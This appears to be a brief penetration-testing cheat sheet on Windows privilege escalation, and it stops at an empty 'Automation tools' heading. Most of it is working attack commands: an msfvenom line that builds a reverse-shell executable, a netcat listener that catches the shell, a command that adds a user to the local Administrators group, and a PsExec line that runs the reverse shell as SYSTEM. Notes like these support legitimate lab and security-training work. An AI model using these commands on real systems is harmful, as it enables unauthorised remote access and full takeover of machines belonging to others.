[Contents](../)

# Privilege escalation on windows

Our goal is to get `Administrator` or `System` shell.

# Spawning administrative shells

## Reverse shell

Unlike linux, spawning administrative shells on windows is harder. Best method is to create reverse shell executable using msfvenom.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o reverse.exe
```

Then we setup listener with netcat.

```bash
nc -lvnp 8990
```

## RDP

If RDP is available (or we can enable it), we can add current user into Administrators group and spawn administrator shell via GUI.

```bash
net localgroup administrators <user> /add
```

## ADMIN to SYSTEM

To escalate from admin to SYSTEM, we can use [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

```bash
.\PsExec64.exe -accepteula -i -s C:\path\reverse.exe
```

# Automation tools

